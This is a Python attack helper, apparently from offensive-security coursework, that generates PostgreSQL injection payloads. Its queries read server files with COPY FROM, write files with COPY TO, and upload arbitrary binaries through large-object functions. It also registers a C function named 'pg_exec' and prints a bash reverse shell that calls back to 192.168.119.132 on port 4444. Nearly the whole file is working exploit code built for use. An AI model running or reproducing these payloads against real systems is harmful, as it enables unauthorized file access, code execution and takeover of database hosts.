from __future__ import print_function
import sys
import base64
import argparse
import binascii

def parse_args():
    parser = argparse.ArgumentParser()
    parser.add_argument('-U', '--upload', dest='upload', required=False, help='upload file with largeobject (I)')
    parser.add_argument('-p', '--path', dest='path', required=False, help='upload file with largeobject (I)')
    parser.add_argument('--noloid', action='store_true', required=False, help='upload file with largeobject (I)')
    parser.add_argument('-C', '--create-fn', dest='udf', required=False, help='create function with udf specified')
    return parser.parse_args()

def read_text(filepath):
    return """CREATE TABLE awae(content text);
COPY awae FROM '%s';
SELECT content from awae;
drop table awae;""" % filepath

def write_text(data, filepath):
    print("WArning: cannot contain \\t, \\n, \\r,,..\n")
    return "COPY (select '%s') TO '%s';" % (data, filepath)

def upload_with_lo(data, filepath, loid=None, page=2048, noSpecLoid=False, encoder='base64'):
    s = []
    if noSpecLoid:
        print('remember to replace c:/windows/win.ini to /etc/hosts if target is Linux', file=sys.stderr)
        s.append("select lo_import( 'c:/windows/win.ini', (select case when count (*) > 0 then MAX(CAST(loid as int))+1 else 1337 end from pg_largeobject));")
        LOID = '(select MAX(CAST(loid as int)) as gg from pg_largeobject)'
        for i in range(0, len(data), page):
            if encoder == 'base64':
                _data = "decode('%s', 'base64')" % base64.b64encode(data[i:i+page]).decode()
            else:
                _data = "decode('%s', 'hex')" % binascii.hexlify(data[i:i+page])

            if i == 0:
                s.append("with LL as %s update pg_largeobject set data=%s from LL where loid=LL.gg and pageno=0;" % (LOID, _data))
            else:
                s.append("insert into pg_largeobject (loid, pageno, data) values (%s, %d, %s);" % (LOID, i//page, _data))
        s.append("select lo_export(%s, '%s');" % (LOID, filepath))
        s.append("select lo_unlink(%s);" % (LOID))
        return '\n'.join(s)
    loid = loid or 4444
    assert loid < 9999, "large object id too large"
    s.append('select lo_unlink(%s);' % loid)
    s.append('select lo_create(%s);' % loid)
    for i in range(0, len(data), page):
        s.append("select lo_put(%s, %d, '\\x%s');" % (loid, i, binascii.hexlify(data[i:i+page])))
    s.append("select lo_export(%s, '%s');" % (loid, filepath))
    s.append("select lo_unlink(%s);" % loid)
    return '\n'.join(s)

def create_udf(filepath):
    s = "DROP FUNCTION IF EXISTS sys(cstring);"
    return s + "CREATE FUNCTION sys(cstring) RETURNS int AS '%s', 'pg_exec' LANGUAGE C STRICT;" % filepath

host, port = '192.168.119.132', 4444

if __name__ == '__main__':
    args = parse_args()

    if args.upload:
        if not args.path:
            print('Large Object Upload must specify an output path ( -p <path-to-write> ) to Export')
            exit(1)
        data = open(args.upload, 'rb').read()
        print(upload_with_lo(data, args.path, noSpecLoid=args.noloid))
    elif args.udf:
        print(create_udf(args.udf))
        print("SELECT sys('bash -c \"bash -i >& /dev/tcp/%s/%s 0>&1\"');" % (host, port))
    else:
        print("read_text\n")
        print(read_text("c:\\windows\\win.ini"))
        print("\nwrite_text\n")
        print(write_text("hello world", "D:\\awae.txt"))

